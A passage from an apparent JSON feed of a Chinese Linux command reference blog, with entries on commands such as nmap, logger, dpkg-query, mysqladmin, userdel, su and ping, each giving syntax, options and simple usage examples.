-e：在多网络接口Linux系统中，指定扫描使用的网络接口； -g：将指定的端口作为源端口进行扫描； --ttl：指定发送的扫描报文的生存期； --packet-trace：显示扫描过程中收发报文统计； --scanflags：设置在扫描报文中的TCP标志。 --send-eth/--send-ip 使用原始以太网发送/构造指定IP发送 参数 ip 地址：指定待扫描报文中的 TCP 地址。 实例 安装 nmap yum install nmap ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"nmap","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/nmap/","stats":{"text":"2 min read","time":85000,"words":386,"minutes":2},"date":"2022-02-01 22:44:17","dateFormat":"2022-02-01"},{"content":"删除由 alias 设置的别名。 概要 unalias [-a] name [name ...] 主要用途 删除一个或多个别名。 删除全部已定义的别名。 选项 -a：删除全部已定义的别名。 参数 name：指定要删除的一个或多个已定义的别名。 返回值 unalias 返回 true 除非您要删除的别名未定义。 例子 # 删除全部已定义的别名 unalias -a # 删除已定义的别名（假设当前环境存在以下别名） unalias vi unalias ls grep 错误用法 要删除的别名未定义。 不使用 -a 选项时没有传递 name 参数。 注意 执行脚本时请注意： 使用source命令执行的 bash 脚本如果执行了alias或unalias命令，那么有可能会对终端环境的别名设置产生影响； 终端环境的别名设置也可能改变运行结果； 通过sh方式调用的 bash 脚本或直接运行当前用户有执行权限的脚本不受终端环境的别名影响。 查看及设置别名，请查看alias命令。 该命令是 bash 内建命令，相关的帮助信息请查看help命令。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"unalias","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/unalias/","stats":{"text":"2 min read","time":64000,"words":298,"minutes":2},"date":"2022-02-01 22:42:57","dateFormat":"2022-02-01"},{"content":"在系统日志中记录相应条目。 补充说明 logger 命令是用于往系统中写入日志，他提供一个 shell 命令接口到 syslog 系统模块 语法 logger [options] [message] 选项 -T, --tcp 使用流连接(TCP) -d, --udp 使用数据报(UDP) -i, --id 逐行记录每一次logger的进程ID -f, --file &lt;file&gt; 记录特定的文件 -h, --help 显示帮助文本并退出 -n, --server &lt;name&gt; 写入指定的远程syslog服务器，使用UDP代替内装式syslog的例程 -P, --port &lt;port&gt; 使用指定的UDP端口。默认的端口号是514 -p, --priority &lt;prio&gt; 指定输入消息的优先级，优先级可以是数字或者指定为 &quot; facility.level&quot; 的格式。 比如：&quot; -p local3.info &quot; local3 这个设备的消息级别为 info。 默认级别是 &quot;user.notice&quot; -s, --stderr 输出标准错误到系统日志。 -t, --tag &lt;tag&gt; 指定标记记录 -u, --socket &lt;socket&gt; 写入指定的socket，而不是到内置系统日志例程。 -V, --version 输出版本信息并退出 例子 logger -p syslog.info &quot;backup.sh is starting&quot; ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"logger","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/logger/","stats":{"text":"2 min read","time":71000,"words":286,"minutes":2},"date":"2022-02-01 22:42:19","dateFormat":"2022-02-01"},{"content":"Debian Linux 中软件包的查询工具。 补充说明 dpkg-query 命令是 Debian Linux 中软件包的查询工具，它从 dpkg 软件包数据库中查询并辨识软件包的信息。 语法 dpkg-query (选项) (参数) 选项 -l：列出符合匹配模式的软件包； -s：查询软件包的状态信息； -L：显示软件包所安装的文件列表； -S：从安装的软件包中查询文件； -w：显示软件包信息； -c：显示软件包的控制文件路径； -p：显示软件包的细节。 参数 软件包名称：指定需要查询的软件包。 实例 查找文件 file1 在哪个包里安装： dpkg-query -S file1 列出 ubuntu 下所安装软件列表： dpkg-query -W --showformat='${Package} ${Version}&lt;span class=&quot;token entity&quot; title=&quot;\\n&quot;&gt;\\n' &gt; filename 查看软件包详细信息： dpkg-query -s capistrano 查看软件包安装时安装到系统的文件列表： dpkg-query -L capistrano 列出所有安装的包： dpkg-query -l 查看软件包的确切状态（是否安装）以及版本号： dpkg-query -W -f='${Status} ${Version}\\n' apache-perl ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"dpkg-query","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/dpkg-query/","stats":{"text":"2 min read","time":67000,"words":284,"minutes":2},"date":"2022-02-01 22:41:48","dateFormat":"2022-02-01"},{"content":"显示 mtools 支持的指令。 补充说明 mtools 命令显示 mtools 支持的指令，mtools 为 MS-DOS 文件系统的工具程序，可模拟许多 MS-DOS 的指令。这些指令都是 mtools 的符号连接，因此会有一些共同的特性。 语法 mtools (选项) 选项 -a：长文件名重复时自动更改目标文件的长文件名； -A：短文件名重复但长文件名不同时自动更改目标文件的短文件名； -o：长文件名重复时，将目标文件覆盖现有的文件； -O：短文件名重复但长文件名不同时，将目标文件覆盖现有的文件； -r：长文件名重复时，要求用户更改目标文件的长文件名； -R：短文件名重复但长文件名不同时，要求用户更改目标文件的短文件名； -s：长文件名重复时，则不处理该目标文件； -S：短文件名重复但长文件名不同时，则不处理该目标文件； -v：执行时显示详细的说明； -V：显示版本信息。 实例 使用 mtools 命令显示其支持的所有的指令，输入如下命令： [root@localhost ~]# mtools #显示所有支持的指令名称 Supported commands: mattrib, mbadblocks, mcat, mcd, mclasserase, mcopy, mdel, mdeltree mdir, mdoctorfat, mdu, mformat, minfo, mlabel, mmd, mmount mpartition, mrd, mread, mmove, mren, mshowfat, mtoolstest, mtype mwrite, mzip 如上所示，其显示的所有命令均为 mtools 工具所支持的。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"mtools","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/mtools/","stats":{"text":"2 min read","time":83000,"words":371,"minutes":2},"date":"2022-02-01 22:41:18","dateFormat":"2022-02-01"},{"content":"用于强制被改变的内容立刻写入磁盘。 补充说明 sync 命令用于强制被改变的内容立刻写入磁盘，更新超块信息。 在 Linux/Unix 系统中，在文件或数据处理过程中一般先放到内存缓冲区中，等到适当的时候再写入磁盘，以提高系统的运行效率。sync 命令则可用来强制将内存缓冲区中的数据立即写入磁盘中。用户通常不需执行 sync 命令，系统会自动执行 update 或 bdflush 操作，将缓冲区的数据写 入磁盘。只有在 update 或 bdflush 无法执行或用户需要非正常关机时，才需手动执行 sync 命令。 语法 sync (选项) 选项 --help：显示帮助； --version：显示版本信息。 buffer 与 cache buffer：为了解决写磁盘的效率 cache：为了解决读磁盘的效率 linux 系统为了提高读写磁盘的效率，会先将数据放在一块 buffer 中。在写磁盘时并不是立即将数据写到磁盘中，而是先写入这块 buffer 中了。此时如果重启系统，就可能造成数据丢失。 sync 命令用来 flush 文件系统 buffer，这样数据才会真正的写到磁盘中，并且 buffer 才能够释放出来，flush 就是用来清空 buffer。sync 命令会强制将数据写入磁盘中，并释放该数据对应的 buffer，所以常常会在写磁盘后输入 sync 命令来将数据真正的写入磁盘。 如果不去手动的输入 sync 命令来真正的去写磁盘，linux 系统也会周期性的去 sync 数据。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"sync","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/sync/","stats":{"text":"2 min read","time":90000,"words":425,"minutes":2},"date":"2022-02-01 22:40:59","dateFormat":"2022-02-01"},{"content":"用于批处理的方式一次创建多个命令。 补充说明 newusers 命令用于批处理的方式一次创建多个命令。 语法 newusers (参数) 参数 用户文件：指定包含用户信息的文本文件，文件的格式要与/etc/passwd相同。 实例 实用 newusers 命令批量添加用户： 用法很简单，newusers 后面直接跟一个文件，文件格式和/etc/passwd的格式相同。 用户名 1:x:UID:GID:用户说明:用户的家目录:所用 SHELL 举例： jingang0:x:520:520::/home/jingang0:/sbin/nologin jingang1:x:521:521::/home/jingang1:/sbin/nologin ...... 值得一提的是关于 SHELL 类型，查看主机上所有 SHELL，可以通过 chsh 来查看： [root@localhost beinan]# chsh --list /bin/sh /bin/bash /sbin/nologin /bin/ksh /bin/tcsh /bin/csh /bin/zsh 其中除了/sbin/nologin，其它类型的 SHELL 都能登录系统，nologin 大多是虚拟用户用的 SHELL，也就是说虽然他是系统用户，但他并无登录系统的权限； 如果您想添加这类用户，就把他的 SHELL 设置成/sbin/nologin，比如上面的例子。 关于用户名、UID、GID 及用户的家目录是怎么回事，您可以读相应的参考文档。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"newusers","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/newusers/","stats":{"text":"2 min read","time":72000,"words":307,"minutes":2},"date":"2022-02-01 22:40:34","dateFormat":"2022-02-01"},{"content":"两个文件中指定栏位内容相同的行连接起来。 补充说明 join 命令用来将两个文件中，制定栏位内容相同的行连接起来。找出两个文件中，指定栏位内容相同的行，并加以合并，再输出到标准输出设备。 语法 join (选项) (参数) 选项 -a&lt;1 或 2&gt;：除了显示原来的输出内容之外，还显示指令文件中没有相同栏位的行； -e&lt;字符串&gt;：若[文件 1] 与[文件 2] 中找不到指定的栏位，则在输出中填入选项中的字符串； -i 或--ignore-case：比较栏位内容时，忽略大小写的差异； -o&lt;格式&gt;：按照指定的格式来显示结果； -t&lt;字符&gt;：使用栏位的分割字符； -v&lt;1 或 2&gt;：更-a 相同，但是只显示文件中没有相同栏位的行； -1&lt;栏位&gt;：连接[文件 1] 指定的栏位； -2&lt;栏位&gt;：连接[文件 2] 指定的栏位。 参数 文件 1：要进行合并操作的第 1 个文件参数； 文件 2：要进行合并操作的第 2 个文件参数。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"join","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/join/","stats":{"text":"2 min read","time":67000,"words":305,"minutes":2},"date":"2022-02-01 22:40:06","dateFormat":"2022-02-01"},{"content":"MySQL 服务器管理客户端。 补充说明 mysqladmin 命令是 mysql 服务器管理任务的客户端工具，它可以检查 mytsql 服务器的配置和当前工作状态，创建和删除数据库，创建用户和修改用户密码等操作。 语法 mysqladmin (选项) (参数) 选项 -h：MySQL 服务器主机名或 ip 地址； -u：连接 MySQL 服务器的用户名； -p：连接 MySQL 服务器的密码； --help：显示帮助信息。 参数 管理命令：需要在 MySQL 服务器上执行的管理命令。 mysqladmin 支持下列命令： create databasename：创建一个新数据库； drop databasename：删除一个数据库及其所有表； extended-status：给出服务器的一个扩展状态消息； flush-hosts：清空所有缓存的主机； flush-logs：清空所有日志； flush-tables：清空所有表； flush-privileges：再次装载授权表 (同 reload)； kill id,id,...：杀死 mysql 线程； password 新口令：将老密码改为新密码； ping：检查 mysqld 是否活着； processlist：显示服务其中活跃线程列表； reload：重载授权表； refresh：清空所有表并关闭和打开日志文件； shutdown：关掉服务器； status：给出服务器的简短状态消息； variables：打印出可用变量； version：得到服务器的版本信息。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"mysqladmin","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/mysqladmin/","stats":{"text":"2 min read","time":73000,"words":328,"minutes":2},"date":"2022-02-01 22:39:51","dateFormat":"2022-02-01"},{"content":"设置第二扩展文件系统的卷标。 补充说明 e2label 命令用来设置第二扩展文件系统的卷标。 语法 e2label (参数) 参数 文件系统：指定文件系统所对应的设备文件名； 新卷标：为文件系统指定新卷标。 实例 许多用了多年 Linux 的人可能也没有用过 e2label 命令。但是这个命令相当有效。在介绍它之前,我们先看看/etc/fstab 文件： label=//ext3 defaults 1 1 /dev/hda7 /usr ext3 defaults 1 1 第二行的意思很容易懂，就是把/dev/hda7 mount 到/usr上。第一行没有指明分区，意思是把 label(卷标) 为/ 的分区 mount 到/上。这样写的好处在于即使如果把硬盘从主板上的 ide0(hda) 换到 ide2(hdc) 上，系统仍然可以自动挂载正确的分区。通常 Linux 安装的时候已经自动指定了卷标。如果是手动增加的新分区，可以用下边的命令为 其指定卷标： e2label /dev/hdax /new mkdir /new 然后在/etc/fstab里加入： label=/new /new ext3 defaults 1 1 下次重新起动机器的时候，就会把卷标为/new的分区挂接到/new上。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"e2label","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/e2label/","stats":{"text":"2 min read","time":69000,"words":305,"minutes":2},"date":"2022-02-01 22:39:25","dateFormat":"2022-02-01"},{"content":"检查磁盘的使用空间与限制。 补充说明 quotacheck 命令通过扫描指定的文件系统，获取磁盘的使用情况，创建、检查和修复磁盘配额（quota）文件。执行 quotacheck 指令，扫描挂入系统的分区，并在各分区的文件系统根目录下产生 quota.user 和 quota.group 文件，设置用户和群组的磁盘空间限制。 语法 quotacheck (选项) (参数) 选项 -a：扫描在/etc/fstab 文件里，有加入 quota 设置的分区； -d：详细显示指令执行过程，便于排错或了解程序执行的情形； -g：扫描磁盘空间时，计算每个群组识别码所占用的目录和文件数目； -R：排除根目录所在的分区； -u：扫描磁盘空间时，计算每个用户识别码所占用的目录和文件数目； -v：显示指令执行过程。 参数 文件系统：指定要扫描的文件系统。 实例 将所有的在/etc/mtab内，含有 quota 支持的 partition 进行扫描： [root@linux ~]# quotacheck -avug quotacheck: Scanning /dev/hdb1 [/disk2] done quotacheck: Checked 3 directories and 4 files 强制扫描已挂载的 filesystem： [root@linux ~]# quotacheck -avug -m ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"quotacheck","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/quotacheck/","stats":{"text":"2 min read","time":67000,"words":300,"minutes":2},"date":"2022-02-01 22:38:36","dateFormat":"2022-02-01"},{"content":"init 进程是所有 Linux 进程的父进程。 补充说明 init 命令是 Linux 下的进程初始化工具，init 进程是所有 Linux 进程的父进程，它的进程号为 1。init 命令是 Linux 操作系统中不可缺少的程序之一，init 进程是 Linux 内核引导运行的，是系统中的第一个进程。 语法 init (选项) (参数) 选项 -b：不执行相关脚本而直接进入单用户模式； -s：切换到单用户模式。 参数 运行等级：指定 Linux 系统要切换到的运行等级。 实例 几个常用的命令 查看系统进程命令：ps -ef | head 查看 init 的配置文件：more /etc/inittab 查看系统当前运行的级别：runlevel 运行级别 到底什么是运行级呢？简单的说，运行级就是操作系统当前正在运行的功能级别。这个级别从 0 到 6 ，具有不同的功能。你也可以在/etc/inittab中查看它的英文介绍。 #0 停机（千万不能把initdefault 设置为0） #1 单用户模式 #2 多用户，没有 NFS(和级别3相似，会停止部分服务) #3 完全多用户模式 #4 没有用到 #5 x11(Xwindow) #6 重新启动（千万不要把initdefault 设置为6） ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"init","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/init/","stats":{"text":"2 min read","time":73000,"words":329,"minutes":2},"date":"2022-02-01 22:38:02","dateFormat":"2022-02-01"},{"content":"显示和设置 shell 操作选项。 补充说明 shopt 命令用于显示和设置 shell 中的行为选项，通过这些选项以增强 shell 易用性。shopt 命令若不带任何参数选项，则可以显示所有可以设置的 shell 操作选项。 语法 shopt (选项) (参数) 选项 -s：激活指定的 shell 行为选项； -u：关闭指定的 shell 行为选项。 参数 shell 选项：指定要操作的 shell 选项。 实例 使用 shopt 命令显示当前所有可以设置的 shell 操作选项，输入如下命令： shopt #输出所有可以设置的shell操作选项 cdable_vars off cdspell off checkhash off checkwinsize on cmdhist on dotglob off execfail off expand_aliases on extdebug off ... 如图上所示，选项&quot;cdspell&quot;的状态为&quot;off&quot;，即关闭 cd 拼写检查选项。现在，可以使用 shopt 命令将其开启，输入如下命令： shopt -s cdspell #开启 cd 拼写检查 执行上面的命令后，该选项的状态将变为&quot;on&quot;，即开启状态。可以再次通过该命令显示一下 shell 操作选项即可，输出信息如下： cdspell on #开启 cdspell 选项 用户可以通过实际执行 cd 命令检查该选项是否被成功开启。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"shopt","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/shopt/","stats":{"text":"2 min read","time":73000,"words":319,"minutes":2},"date":"2022-02-01 22:37:41","dateFormat":"2022-02-01"},{"content":"简单的 IP 地址计算器。 补充说明 ipcalc 命令是一个简单的 ip 地址计算器，可以完成简单的 IP 地址计算任务。 语法 ipcalc (选项) 选项 -b：由给定的 IP 地址和网络掩码计算出广播地址； -h：显示给定 UP 地址所对应的主机名； -m：由给定的 IP 地址计算器网络掩码； -p：显示给定的掩码或 IP 地址的前缀； -n：由给定的 IP 地址和网络掩码计算网络地址； -s：安静模式； --help：显示帮助信息。 实例 [root@localhost ~]# ipcalc -p 192.168.2.1 255.255.255.0 PREFIX=24 [root@localhost ~]# ipcalc -n 192.168.2.1 255.255.255.0 NETWORK=192.168.2.0 [root@localhost ~]# ipcalc -h 127.0.0.1 hostname=localhost.localdomain [root@localhost ~]# ipcalc -m 192.168.2.1 NETMASK=255.255.255.0 [root@localhost ~]# ipcalc -pnbm 192.168.2.1 255.255.255.0 NETMASK=255.255.255.0 PREFIX=24 BROADCAST=192.168.2.255 NETWORK=192.168.2.0 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ipcalc","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ipcalc/","stats":{"text":"2 min read","time":63000,"words":231,"minutes":2},"date":"2022-02-01 22:19:38","dateFormat":"2022-02-01"},{"content":"命令设置终端机视窗的大小。 补充说明 resize 命令命令设置终端机视窗的大小。执行 resize 指令可设置虚拟终端机的视窗大小。 语法 resize [-cu][-s &lt;列数&gt; &lt;行数&gt;] 选项 -c 就算用户环境并非C Shell，也用C Shell指令改变视窗大小。 -s &lt;列数&gt; &lt;行数&gt; 设置终端机视窗的垂直高度和水平宽度。 -u 就算用户环境并非Bourne Shell，也用Bourne Shell指令改变视窗大小。 实例 使用 C shell [root@localhost ~]# resize -c set noglob; setenv COLUMNS '99'; setenv LINES '34'; unset noglob; 使用 Bourne shell [root@localhost ~]# resize -u COLUMNS=99; LINES=34; export COLUMNS LINES; 设置指定大小 [root@localhost ~]# resize -s 80 160 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"resize","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/resize/","stats":{"text":"1 min read","time":46000,"words":183,"minutes":1},"date":"2022-02-01 22:18:36","dateFormat":"2022-02-01"},{"content":"拒绝用户登录系统。 补充说明 nologin 命令可以实现礼貌地拒绝用户登录系统，同时给出信息。如果尝试以这类用户登录，就在 log 里添加记录，然后在终端输出 This account is currently not available 信息，就是这样。一般设置这样的帐号是给启动服务的账号所用的，这只是让服务启动起来，但是不能登录系统。 语法 nologin 实例 Linux 禁止用户登录： 禁止用户登录后，用户不能登录系统，但可以登录 ftp、SAMBA 等。我们在 Linux 下做系统维护的时候，希望个别用户或者所有用户不能登录系统，保证系统在维护期间正常运行。这个时候我们就要禁止用户登录。 1、禁止个别用户登录，比如禁止 lynn 用户登录。 passwd -l lynn 这就话的意思是锁定 lynn 用户，这样该用户就不能登录了。 passwd -u lynn 上面是对锁定的用户 lynn 进行解锁，用户可登录了。 2、我们通过修改/etc/passwd文件中用户登录的 shell vi /etc/passwd 更改为： lynn:x:500:500::/home/lynn:/sbin/nologin 该用户就无法登录了。 3、禁止所有用户登录。 touch /etc/nologin 除 root 以外的用户不能登录了。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"nologin","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/nologin/","stats":{"text":"2 min read","time":75000,"words":338,"minutes":2},"date":"2022-02-01 22:18:20","dateFormat":"2022-02-01"},{"content":"用于删除给定的用户以及与用户相关的文件。 补充说明 userdel 命令用于删除给定的用户，以及与用户相关的文件。若不加选项，则仅删除用户帐号，而不删除相关文件。 语法 userdel (选项) (参数) 选项 -f：强制删除用户，即使用户当前已登录； -r：删除用户的同时，删除与用户相关的所有文件。 参数 用户名：要删除的用户名。 实例 userdel 命令很简单，比如我们现在有个用户 linuxde，其家目录位于/var目录中，现在我们来删除这个用户： userdel linuxde # 删除用户 linuxde，但不删除其家目录及文件； userdel -r linuxde # 删除用户 linuxde，其家目录及文件一并删除； 请不要轻易用-r选项； 他会删除用户的同时删除用户所有的文件和目录，切记如果用户目录下有重要的文件，在删除前请备份。 其实也有最简单的办法，但这种办法有点不安全，也就是直接在/etc/passwd中删除您想要删除用户的记录；但最好不要这样做，/etc/passwd是极为重要的文件，可能您一不小心会操作失误。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"userdel","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/userdel/","stats":{"text":"2 min read","time":67000,"words":323,"minutes":2},"date":"2022-02-01 22:17:44","dateFormat":"2022-02-01"},{"content":"在文件内查找指定的字符串。 补充说明 egrep 命令用于在文件内查找指定的字符串。egrep 执行效果与grep -E相似，使用的语法及参数可参照 grep 指令，与 grep 的不同点在于解读字符串的方法。egrep 是用 extended regular expression 语法来解读的，而 grep 则用 basic regular expression 语法解读，extended regular expression 比 basic regular expression 的表达更规范。 语法 egrep (选项)(查找模式)(文件名 1，文件名 2，……) 实例 显示文件中符合条件的字符。例如，查找当前目录下所有文件中包含字符串&quot;Linux&quot;的文件，可以使用如下命令： egrep Linux * 结果如下所示： # 以下五行为 testfile 中包含Linux字符的行 testfile:hello Linux! testfile:Linux is a free Unix-type operating system. testfile:This is a Linux testfile! testfile:Linux testfile:Linux # 以下两行为testfile1中含Linux字符的行 testfile1:helLinux! testfile1:This a Linux testfile! # 以下两行为 testfile_2 中包含Linux字符的行 testfile_2:Linux is a free unix-type opterating system testfile_2:Linux test ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"egrep","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/egrep/","stats":{"text":"2 min read","time":65000,"words":262,"minutes":2},"date":"2022-02-01 22:16:56","dateFormat":"2022-02-01"},{"content":"将后台作业移动到前台终端运行。 概要 fg [job_spec ...] 主要用途 用于将后台作业（在后台运行的或者在后台挂起的作业）放到前台终端运行。 若后台任务中只有一个，则使用该命令时可以省略任务号。 参数 job_spec（可选）：指定要移动到前台执行的作业标识符，可以是一到多个。 返回值 返回作业的执行状态，如果发生了错误返回失败。 例子 # 运行sleep命令，然后按下ctrl+z。 sleep 60 ^Z [1]+ Stopped sleep 60 # 使用fg命令使得作业在前台运行。 fg %1 # 返回信息： sleep 60 注意 bash的作业控制命令包括bg fg kill wait disown suspend。 该命令需要set选项monitor处于开启状态时才能执行； 查看作业控制状态：输入set -o查看monitor行；执行set -o monitor或set -m开启该选项。 该命令是 bash 内建命令，相关的帮助信息请查看help命令。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"fg","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/fg/","stats":{"text":"1 min read","time":56000,"words":255,"minutes":1},"date":"2022-02-01 22:16:11","dateFormat":"2022-02-01"},{"content":"用于切换当前用户身份到其他用户身份。 补充说明 su 命令用于切换当前用户身份到其他用户身份，变更时须输入所要变更的用户帐号与密码。 语法 su (选项) (参数) 选项 -c&lt;指令&gt;或--command=&lt;指令&gt;：执行完指定的指令后，即恢复原来的身份； -f 或——fast：适用于 csh 与 tsch，使 shell 不用去读取启动文件； -l 或——login：改变身份时，也同时变更工作目录，以及 HOME,SHELL,USER,logname。此外，也会变更 PATH 变量； -m,-p 或--preserve-environment：变更身份时，不要变更环境变量； -s&lt;shell&gt;或--shell=&lt;shell&gt;：指定要执行的 shell； --help：显示帮助； --version； 显示版本信息。 参数 用户：指定要切换身份的目标用户。 实例 变更帐号为 root 并在执行 ls 指令后退出变回原使用者： su -c ls root 变更帐号为 root 并传入-f选项给新执行的 shell： su root -f 变更帐号为 test 并改变工作目录至 test 的家目录： su -test ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"su","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/su/","stats":{"text":"2 min read","time":64000,"words":280,"minutes":2},"date":"2022-02-01 22:15:54","dateFormat":"2022-02-01"},{"content":"用来列出压缩文件信息。 补充说明 zipinfo 命令用来列出压缩文件信息。执行 zipinfo 指令可得知 zip 压缩文件的详细信息。 语法 zipinfo (选项) (参数) 选项 -1：只列出文件名称； -2：此参数的效果和指定“-1”参数类似，但可搭配“-h”，“-t”和“-z”参数使用； -h：只列出压缩文件的文件名称； -l：此参数的效果和指定“-m”参数类似，但会列出原始文件的大小而非每个文件的压缩率； -m：此参数的效果和指定“-s”参数类似，但多会列出每个文件的压缩率； -M：若信息内容超过一个画面，则采用类似 more 指令的方式列出信息； -s：用类似执行“ls-l”指令的效果列出压缩文件内容； -t：只列出压缩文件内所包含的文件数目，压缩前后的文件大小及压缩率； -T：将压缩文件内每个文件的日期时间用年，月，日，时，分，秒的顺序列出； -v：详细显示压缩文件内每一个文件的信息； -x&lt;范本样式&gt;：不列出符合条件的文件的信息； -z：如果压缩文件内含有注释，就将注释显示出来。 参数 文件：指定 zip 格式的压缩包。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"zipinfo","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/zipinfo/","stats":{"text":"2 min read","time":73000,"words":343,"minutes":2},"date":"2022-02-01 22:15:36","dateFormat":"2022-02-01"},{"content":"测试主机之间网络的连通性。 补充说明 ping 命令用来测试主机之间网络的连通性。执行 ping 指令会使用 ICMP 传输协议，发出要求回应的信息，若远端主机的网络功能没有问题，就会回应该信息，因而得知该主机运作正常。 语法 ping (选项) (参数) 选项 -d：使用 Socket 的 SO_DEBUG 功能； -c&lt;完成次数&gt;：设置完成要求回应的次数； -f：极限检测； -i&lt;间隔秒数&gt;：指定收发信息的间隔时间； -I&lt;网络界面&gt;：使用指定的网络界面送出数据包； -l&lt;前置载入&gt;：设置在送出要求信息之前，先行发出的数据包； -n：只输出数值； -p&lt;范本样式&gt;：设置填满数据包的范本样式； -q：不显示指令执行过程，开头和结尾的相关信息除外； -r：忽略普通的 Routing Table，直接将数据包送到远端主机上； -R：记录路由过程； -s&lt;数据包大小&gt;：设置数据包的大小； -t&lt;存活数值&gt;：设置存活数值 TTL 的大小； -v：详细显示指令的执行过程。 参数 目的主机：指定发送 ICMP 报文的目的主机。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ping","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ping/","stats":{"text":"2 min read","time":72000,"words":330,"minutes":2},"date":"2022-02-01 22:15:22","dateFormat":"2022-02-01"},{"content":"whois 客户端服务。 补充说明 jwhois 命令是在 Whois 服务器上搜索命令行上要查询的域名主机。从 Whois 服务器的全局的配置文件具有一定的权威性，从 Whois 服务器上获取要查询的信息后，显示在命令行中。 语法 jwhois [选项 ] 选项 --version display version number and patch level --help display this help -v, --verbose verbose debug output -c FILE, --config=FILE use FILE as configuration file -h HOST, --host=HOST explicitly query HOST -n, --no-redirect disable content redirection -s, --no-whoisservers disable whois-servers.net service support -a, --raw disable reformatting of the query -i, --display-redirections display all redirects instead of hiding them -p PORT, --port=PORT use port number PORT (in conjunction with HOST) -r, --rwhois force an rwhois query to be made --rwhois-display=DISPLAY sets the display option in rwhois queries --rwhois-limit=LIMIT sets the maximum number of matches to return 实例 显示指定用户信息： jwhois root# 查找 root 用户信息 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"jwhois","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/jwhois/","stats":{"text":"2 min read","time":61000,"words":209,"minutes":2},"date":"2022-02-01 22:14:22","dateFormat":"2022-02-01"},{"content":"在当前 Shell 环境中从指定文件读取和执行命令。。 概要 source filename [arguments] 主要用途 执行文件并从文件中加载变量及函数到执行环境 参数 filename：要执行的文件 arguments（可选）：传递给文件的参数 返回值 source 返回文件最后一个命令的返回值，如果文件不能读取则会失败 错误用法 文件在$PATH中找不到。 文件未给出。 例子 在一些工具的执行过程中，会把环境变量设置以&quot;export XXX=XXXXXX&quot;或&quot;declare XXX=XXXXXX&quot;的形式导出到一个文件中，然后用 source 加载该文件内容到执行环境中。 读取和执行/root/.bash_profile 文件。 [root@localhost ~]# source ~/.bash_profile Q&amp;A 